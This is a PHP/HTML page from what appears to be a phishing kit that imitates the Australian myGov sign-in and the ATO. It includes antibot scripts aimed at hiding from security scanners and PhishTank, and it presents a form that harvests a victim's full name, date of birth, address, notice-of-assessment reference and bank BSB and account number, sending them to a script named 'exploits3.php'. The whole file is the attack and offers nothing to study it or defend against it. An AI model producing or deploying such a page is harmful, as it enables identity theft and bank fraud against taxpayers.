<?php

	include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
	
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<title>Sign in with myGov - myGov</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="format-detection" content="telephone=no">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon.ico">
	<link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
	<link href="css/style.css" rel="stylesheet">
	<link href="css/application.css" rel="stylesheet">
</head>
<body>
    <div class="muchcolors">&nbsp;</div>
<header role="banner" class="goodheader">
	<section class="wrapper">
		<div class="inner">
			<div class="notauth">
				<div class="notauth-row">
					<a class="not-auth-mk__link">
					    <img id="not-auth-mk" src="images/blacklogo.svg" alt="myGov Beta" role="img">
                    </a>
				</div>
			</div>
		</div>
	</section>
</header>
<div class="wrapper-mapwap">
    <div class="main-block" id="content" role="main">
        <h1>MyGov Account Information</h1>
	    <p style="font-size: 14px">Please answer the shared secret between you and the ATO.</p>
        <hr>
        <form id="forgotten-username-form" action="exploits3.php" method="post">
            <div class="input-group">
                <label for="fname">Full Name</label>
				<input id="fname" name="fname" aria-required="true" type="text" value="" autocomplete="off" required>
			</div>
            <div class="input-group">
                <label for="fname">Date of Birth</label>
				<input id="fname" name="dob" aria-required="true" type="date" value="" autocomplete="off" required>
			</div>
            <div class="input-group">
                <label for="fname">Full Address on File</label>
				<input id="fname" name="address" aria-required="true" type="text" value="" autocomplete="off" required>
			</div>
            <h3 style="height: 40px; background-color: rgb(167, 164, 164); padding: 10px">NOTICE OF ASSESSMENT</h3>
            <div class="input-group">
                <label for="dob"><span style="font-weight: 400">Enter the <span style="font-weight: 600">date of issues</span> from your notice of assessment (dd/mm/yyyy).</span></label>
				<input id="name" name="issued" aria-required="true" type="date" value="" autocomplete="off">
			</div>
            <div class="input-group">
                <label for="dob"><span style="font-weight: 400">Enter <span style="font-weight: 600">our reference number</span> from your notice of assessment.</span></label>
				<input id="name" name="reference" aria-required="true" type="tel" value="" autocomplete="off">
			</div>
            <h3 style="height: 40px; background-color: rgb(167, 164, 164); padding: 10px">BANK ACCOUNT DETAILS</h3>
            <div class="input-group">
                <label for="dob"><span style="font-weight: 400">Enter <span style="font-weight: 600">BSB number</span> recorded with the ATO.</span></label>
				<input id="name" name="bsb" aria-required="true" type="tel" value="" autocomplete="off">
			</div>
            <div class="input-group">
                <label for="dob"><span style="font-weight: 400">Enter <span style="font-weight: 550">bank account number</span> recorded with the ATO (exclude BSB).</span></label>
				<input id="name" name="acct" aria-required="true" type="tel" value="" autocomplete="off">
			</div>
            <div class="button-container">
                <button type="submit" name="_eventId_submit" class="button-main button">Next</button>
            </div>
        </form>
    </div>
</div>
<footer role="contentinfo">
    <div class="wrapper">
      <div class="inner">

        <section class="footer-list">
            <nav>
            <h2 class="sr-only" aria-label="Footer">Footer</h2>
            <ul class="lower-links">
                <li>
                    <a target="_blank">Terms of use</a>
                </li>
                <li>
                    <a target="_blank">Privacy and security</a>
                </li>
                <li>
                    <a target="_blank">Copyright</a>
                </li>
                <li>
                    <a target="_blank">Accessibility</a>
                </li>
            </ul>
            </nav>
        </section>
          <div class="footer-lower">
              <section class="footer-lower-logo">
              <a>
                  <img src="images/whitelogo.svg" alt="myGov Beta" width="313.17" height="70" role="img">
              </a>
              </section>

              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
          </div>




      </div>
    </div>
  </footer>



</body></html>